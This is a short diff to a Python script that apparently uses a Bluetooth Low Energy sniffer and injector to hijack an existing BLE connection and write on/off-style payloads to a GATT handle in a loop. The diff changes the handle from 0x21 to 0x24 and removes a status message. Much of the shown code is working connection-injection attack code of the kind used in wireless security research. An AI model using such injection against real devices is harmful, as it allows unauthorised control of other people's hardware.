@@ -14,7 +14,6 @@ if __name__ == '__main__':
 
         # Connect to target device and performs discovery
         try:
-            print('[i] Connecting to device ...')
             dev = UartDevice(device, 115200)
             sniffer = Sniffer(dev)
             sniffer.configure(advertisements=False, connection=True)
@@ -25,11 +24,11 @@ if __name__ == '__main__':
             input()
             injector = sniffer.available_actions(Injector)[0]
             while True:
-                a = injector.inject(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a"))
+                a = injector.inject(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x24, data=b"\x55\x10\x00\x0d\x0a"))
                 print(a)
                 print("Press enter to inject.")
                 input()
-                a = injector.inject(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a"))
+                a = injector.inject(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x24, data=b"\x55\x10\x01\x0d\x0a"))
                 print(a)
                 print("Press enter to inject.")
                 input()
